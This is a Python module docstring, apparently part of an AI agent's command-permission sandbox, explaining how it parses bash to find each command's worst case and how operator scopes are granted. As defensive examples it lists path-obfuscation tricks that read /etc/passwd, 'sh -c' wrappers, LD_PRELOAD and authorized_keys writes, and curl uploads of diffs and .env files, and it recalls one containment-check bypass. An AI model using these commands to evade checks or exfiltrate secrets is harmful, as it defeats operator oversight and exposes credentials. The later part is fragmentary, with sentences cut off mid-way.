r"""Reading a shell command's worst case off its grammar.

The half of the capability extraction that has to understand bash. Split from
``capability.py`` because the two change for entirely different reasons: this file moves
when the grammar grows a construct or a construct's worst case is read wrong, and that one
moves when a tool is added. Keeping them together would mean a tree-sitter node table and
a tool-name table living in one file and being edited by two different kinds of change.

**Why a real parser.** A command's worst case is a property of its *syntax* — which words
are program names, which are arguments, where a substitution nests — and regexes over that
syntax are wrong on exactly the cases that matter: a `;` inside a quoted string, a `$(…)`
inside a `"…"`, a redirect glued to a word. `tree-sitter-bash` is the maintained grammar,
and it recovers from errors instead of throwing, so a command it cannot parse comes back
as a tree with error nodes we can *see* and treat as unreadable — rather than as an
exception someone might catch and shrug off. `bashlex`, the pure-Python alternative, has
been unmaintained since ~2019 and breaks on ordinary bashisms.

**Every unread construct is recorded, never skipped.** A skipped node would silently
shrink the described worst case to less than the real one, which is the one failure a
deterministic stage cannot have — its consumer would then clear a command on the strength
of the part of it that parsed.

**A word is only literal if the shell would hand it over unchanged.** The grammar gives
back the text as *written*, and the program is handed the text as *expanded* — and between
the two sit brace expansion, globbing and backslash removal, none of which the tree
records. `cat .\./etc/passwd`, `cat \/etc/passwd`, `cat {..,}/etc/passwd` and
`cat .[.]/.[.]/etc/passwd` all read `/etc/passwd` under `/bin/sh` while naming, as written,
a path with no `..` and no leading slash for a containment check to catch. So a bare word
carrying any of those characters is not read as a literal at all: it is recorded as
unbounded, exactly like a `$VAR`, and for the same reason — the value arrives later.

**And a word is only an operand if the program reads it as one.** `sh -c 'cat /etc/passwd'`
is a single word to the shell and a whole command line to `sh`; `python3 -c "print(open('…')
.read())"` is a program; `awk 'BEGIN{while((getline l < "/etc/passwd")>0) print l}'` is a
script. Measuring any of them as one relative path places `<root>/cat /etc/passwd` inside
the worktree and calls the command contained, which is how the containment check was walked
straight past. Telling those apart from `git commit -m 'fix the parser'` needs to know what
the *program* does with the string — the question this file exists to stop asking, because
answering it is the program table that was removed. So the reading is structural and
conservative: a literal argument carrying whitespace or the punctuation a parser reads as
syntax (:data:`_COMPOSITE`) is not a word this walk can place, and is recorded as unbounded.
The price is that a quoted multi-word argument escalates to the model reviewer instead of
clearing for free; the alternative price was `sh -c` running unreviewed.

**Every word a command line carries is measured, not only the operands.** The program
itself (`~/evil.sh`, `/etc/../bin/ls`) and an environment assignment's value
(`GIT_DIR=../../other/.git`, `LD_PRELOAD=/abs/x.so`) are paths as plainly as anything
after `cat`, and a walk that recorded only operands and redirect destinations handed all
of them a clean containment check — while refusing the identical path one position to the
right. A *bare* program name is the one exception and not an oversight: `ls` resolves
through `PATH`, which this command line did not write.

**What that does *not* cover, stated so nobody reads more into it.** The walk bounds what a
command's own words name. A command that takes its paths from *bytes* at run time —
`xargs cat < list`, a script the model just wrote — names nothing this file can read, and no
grammar could. The fence is the answer for that class, and it is a partial one: it bounds
writes and egress, not reads (``services/sandbox/fence.py``). So a fenced ``workspace``
command can still read outside the worktree by a route its words did not name — it just
cannot send what it read anywhere, or write anywhere but the worktree.

    Per stage: the program, the flags written in front of its operands, and the operands

    what a standing permission can be scoped to without being scoped to one invocation:
    `uv run pytest tests/test_a.py` and `uv run pytest tests/test_b.py` are the same act
    on different targets, and an operator saying "stop asking about this" means the act.

    **Every stage, not just the first**, because a pipeline is not one act. `git diff |
    curl -T - https://…` reads as a diff at its head and uploads at its tail, so a scope
    taken off the first command would name the harmless half and let the other run
    unasked. The answer is one prefix per command the walk found, and a caller matching a
    command against standing scopes has to satisfy every one of them.

    None where nothing may be inferred: a command with an unbounded construct in it (the
    word that decides the act may be the one we could not read), one with no command this
    file can name, and one **naming a path outside the workspace**. That last is not the
    same kind of refusal as the other two and is worth saying why it is here: `uv run
    pytest` and `uv run pytest > ~/.ssh/authorized_keys` lead with the same words and are
    not the same act — the second leaves the worktree, which is the boundary the fence is
    built around. A scope is a standing yes to an act *on a different target*, and a target
    outside the workspace is a different act.

    Every word is a word the operator can read back: non-empty, and free of the whitespace
    and syntax a second reader would have to re-quote. That holds because the walk refuses
    a composite program and a composite argument outright, and because an empty argument

    read `curl -sS https://api.example/x` as the one-word scope `("curl",)` — and since a

    `("curl",)` too, so one yes to an API fetch stood equally for `curl -d @.env
    https://elsewhere`. The same collapse turned `env -i true` into a standing yes to `env
    -i rm -rf src`. Keeping the flag costs the cap nothing and narrows the scope instead
    of ending it: what the cap is there to withhold is the *target*, and a target is an
    operand.

    A consequence worth stating, because it is what makes equality safe: a scope shorter
    than the cap covers only a command of exactly that shape. `ls -la` reads as `("ls",

    that *reached* the cap covers the same act on another target — which is the case the

    An empty argument ends the prefix as the cap does. `git commit ""` is `git commit` with
